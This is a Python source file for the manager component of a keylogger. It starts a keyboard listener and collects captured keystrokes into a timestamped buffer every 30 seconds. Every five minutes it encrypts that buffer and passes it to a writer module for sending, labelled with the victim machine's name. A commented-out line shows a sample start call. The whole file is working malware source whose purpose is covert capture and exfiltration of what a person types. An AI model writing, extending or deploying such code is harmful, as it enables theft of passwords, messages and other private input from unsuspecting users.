from keylogger_listener import ListenerKeyboard
from encrypt import Encryption
from file_writer import FileWriter
import time
from datetime import datetime
import threading




class KeyloggerManager:

    def __init__(self,key,machine_name):
        self.keylogger_listener = ListenerKeyboard()
        self.buffer = {}
        self.key = key
        self.to_send = FileWriter()
        self.machine_name = machine_name
        self.copied = False



    def start(self):
        self.keylogger_listener.start_logging()
        thread = threading.Thread(target=self.get_update,daemon=True)
        thread.start()
        self.send_data()



    def get_update(self):
        while True:
           time.sleep(30)
           recent = self.keylogger_listener.get_logged_keys()
           cur_time = datetime.now().strftime("%d/%m/%y_%H:%M")
           if self.copied:
              self.buffer = {}
              self.copied = False
           if recent:
                if cur_time in self.buffer:
                   self.buffer[cur_time] += recent
                else:
                   self.buffer[cur_time] = recent

    def send_data(self):
        while True:
          time.sleep(300)
          dic2 = self.buffer.copy()
          self.copied = True
          text = ""
          for k,v in self.buffer.items():
            text += f"{k}:\n"
            for n in v:
                text += n
          encrypting_text = Encryption(text,self.key)
          encrypted_text = encrypting_text.encrypt_text()
          self.to_send.send_data(encrypted_text,self.machine_name)













# a = KeyloggerManager("147852","test.txt")
# a.start()
